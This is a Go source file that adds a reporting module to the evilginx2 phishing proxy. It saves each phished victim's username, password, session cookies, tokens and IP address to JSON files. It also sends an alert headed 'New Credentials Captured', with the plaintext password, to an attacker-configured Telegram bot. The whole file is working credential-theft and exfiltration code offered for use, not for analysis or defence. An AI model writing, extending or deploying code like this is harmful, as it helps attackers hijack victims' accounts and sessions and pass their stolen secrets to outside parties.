package reporter

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// TelegramConfig holds the Telegram bot configuration
type TelegramConfig struct {
	BotToken string `json:"bot_token"`
	ChatID   string `json:"chat_id"`
	Enabled  bool   `json:"enabled"`
}

// Reporter handles session reporting and Telegram notifications
type Reporter struct {
	reportsDir      string
	telegramConfig  *TelegramConfig
	telegramEnabled bool
	httpClient      *http.Client
}

// SessionReport represents a complete session report
type SessionReport struct {
	SessionID     string                                `json:"session_id"`
	Phishlet      string                                `json:"phishlet"`
	Username      string                                `json:"username"`
	Password      string                                `json:"password"`
	HiddenService string                                `json:"hidden_service"`
	LandingURL    string                                `json:"landing_url"`
	IP            string                                `json:"ip"`
	UserAgent     string                                `json:"user_agent"`
	Timestamp     time.Time                             `json:"timestamp"`
	Cookies       map[string]map[string]*CookieToken    `json:"cookies"`
	Custom        map[string]string                     `json:"custom"`
	BodyTokens    map[string]string                     `json:"body_tokens"`
	HTTPTokens    map[string]string                     `json:"http_tokens"`
}

// CookieToken represents a captured cookie
type CookieToken struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	HttpOnly bool   `json:"http_only"`
}

// NewReporter creates a new reporter instance
func NewReporter(reportsDir string, telegramConfigPath string) (*Reporter, error) {
	// Create reports directory if it doesn't exist
	if err := os.MkdirAll(filepath.Join(reportsDir, "sessions"), 0755); err != nil {
		return nil, fmt.Errorf("failed to create sessions directory: %v", err)
	}
	if err := os.MkdirAll(filepath.Join(reportsDir, "credentials"), 0755); err != nil {
		return nil, fmt.Errorf("failed to create credentials directory: %v", err)
	}
	if err := os.MkdirAll(filepath.Join(reportsDir, "raw"), 0755); err != nil {
		return nil, fmt.Errorf("failed to create raw directory: %v", err)
	}

	r := &Reporter{
		reportsDir: reportsDir,
		httpClient: &http.Client{
			Timeout: 10 * time.Second,
		},
	}

	// Load Telegram config if provided
	if telegramConfigPath != "" {
		if _, err := os.Stat(telegramConfigPath); err == nil {
			config, err := loadTelegramConfig(telegramConfigPath)
			if err != nil {
				log.Warning("failed to load telegram config: %v", err)
			} else {
				r.telegramConfig = config
				r.telegramEnabled = config.Enabled
				if r.telegramEnabled {
					log.Info("Telegram notifications enabled")
				}
			}
		}
	}

	return r, nil
}

// loadTelegramConfig loads Telegram configuration from file
func loadTelegramConfig(path string) (*TelegramConfig, error) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var config TelegramConfig
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, err
	}

	return &config, nil
}

// ReportSession saves a session report and sends Telegram notification
func (r *Reporter) ReportSession(session *database.Session, hiddenService string) error {
	report := r.convertToReport(session, hiddenService)

	// Save to JSON file
	if err := r.saveSessionReport(report); err != nil {
		log.Error("failed to save session report: %v", err)
	}

	// Save credentials separately
	if report.Username != "" && report.Password != "" {
		if err := r.saveCredentials(report); err != nil {
			log.Error("failed to save credentials: %v", err)
		}

		// Send Telegram notification
		if r.telegramEnabled {
			if err := r.sendTelegramNotification(report); err != nil {
				log.Error("failed to send telegram notification: %v", err)
			} else {
				log.Success("Telegram notification sent for session: %s", session.SessionId)
			}
		}
	}

	return nil
}

// convertToReport converts a database session to a report
func (r *Reporter) convertToReport(session *database.Session, hiddenService string) *SessionReport {
	cookies := make(map[string]map[string]*CookieToken)
	for domain, domainCookies := range session.CookieTokens {
		cookies[domain] = make(map[string]*CookieToken)
		for name, cookie := range domainCookies {
			cookies[domain][name] = &CookieToken{
				Name:     cookie.Name,
				Value:    cookie.Value,
				Path:     cookie.Path,
				HttpOnly: cookie.HttpOnly,
			}
		}
	}

	return &SessionReport{
		SessionID:     session.SessionId,
		Phishlet:      session.Phishlet,
		Username:      session.Username,
		Password:      session.Password,
		HiddenService: hiddenService,
		LandingURL:    session.LandingURL,
		IP:            session.RemoteAddr,
		UserAgent:     session.UserAgent,
		Timestamp:     time.Unix(session.UpdateTime, 0),
		Cookies:       cookies,
		Custom:        session.Custom,
		BodyTokens:    session.BodyTokens,
		HTTPTokens:    session.HttpTokens,
	}
}

// saveSessionReport saves the complete session report
func (r *Reporter) saveSessionReport(report *SessionReport) error {
	filename := fmt.Sprintf("%s_%s.json", 
		report.Timestamp.Format("20060102_150405"), 
		report.SessionID[:8])
	
	path := filepath.Join(r.reportsDir, "sessions", filename)
	
	data, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return err
	}

	return ioutil.WriteFile(path, data, 0644)
}

// saveCredentials saves just the credentials for quick reference
func (r *Reporter) saveCredentials(report *SessionReport) error {
	creds := map[string]interface{}{
		"timestamp":      report.Timestamp.Format(time.RFC3339),
		"hidden_service": report.HiddenService,
		"phishlet":       report.Phishlet,
		"username":       report.Username,
		"password":       report.Password,
		"ip":             report.IP,
		"session_id":     report.SessionID,
	}

	filename := fmt.Sprintf("%s_%s_creds.json", 
		report.Timestamp.Format("20060102_150405"), 
		report.SessionID[:8])
	
	path := filepath.Join(r.reportsDir, "credentials", filename)
	
	data, err := json.MarshalIndent(creds, "", "  ")
	if err != nil {
		return err
	}

	return ioutil.WriteFile(path, data, 0644)
}

// sendTelegramNotification sends a notification to Telegram
func (r *Reporter) sendTelegramNotification(report *SessionReport) error {
	if !r.telegramEnabled || r.telegramConfig == nil {
		return nil
	}

	message := r.formatTelegramMessage(report)
	return r.sendTelegramMessage(message)
}

// formatTelegramMessage formats the report for Telegram
func (r *Reporter) formatTelegramMessage(report *SessionReport) string {
	msg := "🔐 <b>New Credentials Captured</b>\n\n"
	msg += fmt.Sprintf("🌐 <b>Hidden Service:</b> %s\n", report.HiddenService)
	msg += fmt.Sprintf("🎯 <b>Phishlet:</b> %s\n", report.Phishlet)
	msg += fmt.Sprintf("👤 <b>Username:</b> <code>%s</code>\n", report.Username)
	msg += fmt.Sprintf("🔑 <b>Password:</b> <code>%s</code>\n", report.Password)
	msg += fmt.Sprintf("📍 <b>IP:</b> %s\n", report.IP)
	msg += fmt.Sprintf("🕐 <b>Time:</b> %s\n", report.Timestamp.Format("2006-01-02 15:04:05 UTC"))
	
	if len(report.Cookies) > 0 {
		cookieCount := 0
		for _, domainCookies := range report.Cookies {
			cookieCount += len(domainCookies)
		}
		msg += fmt.Sprintf("🍪 <b>Cookies:</b> %d captured\n", cookieCount)
	}
	
	if len(report.BodyTokens) > 0 {
		msg += fmt.Sprintf("🎫 <b>Tokens:</b> %d captured\n", len(report.BodyTokens))
	}

	return msg
}

// sendTelegramMessage sends a message to Telegram
func (r *Reporter) sendTelegramMessage(text string) error {
	if r.telegramConfig == nil {
		return fmt.Errorf("telegram config not loaded")
	}

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", r.telegramConfig.BotToken)

	payload := map[string]interface{}{
		"chat_id":    r.telegramConfig.ChatID,
		"text":       text,
		"parse_mode": "HTML",
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal payload: %v", err)
	}

	resp, err := r.httpClient.Post(apiURL, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return fmt.Errorf("failed to send message: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("telegram API error: %s - %s", resp.Status, string(body))
	}

	return nil
}
